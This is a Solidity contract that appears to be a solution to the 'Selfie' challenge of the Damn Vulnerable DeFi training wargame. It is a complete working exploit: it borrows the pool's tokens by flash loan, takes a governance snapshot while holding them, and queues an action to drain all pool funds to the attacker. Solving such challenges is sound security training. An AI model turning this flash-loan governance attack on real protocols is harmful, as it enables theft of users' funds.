// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
// import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
// import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieExploit {

    DamnValuableTokenSnapshot public immutable token;
    SimpleGovernance public immutable govt;
    SelfiePool public immutable pool;
    address public immutable owner;

    event ActionId(uint256 id);

    constructor(address tokenAddress, address govtAddress, address poolAddress) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        govt = SimpleGovernance(govtAddress);
        pool = SelfiePool(poolAddress);
        owner = msg.sender;
    }

    function exploit() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        console.log("estoy aqui 1");
        uint256 id = govt.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            ),
            0
        );
        console.log("action id is %s", id);
        emit ActionId(id);
        console.log("estoy aqui 2");
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }
}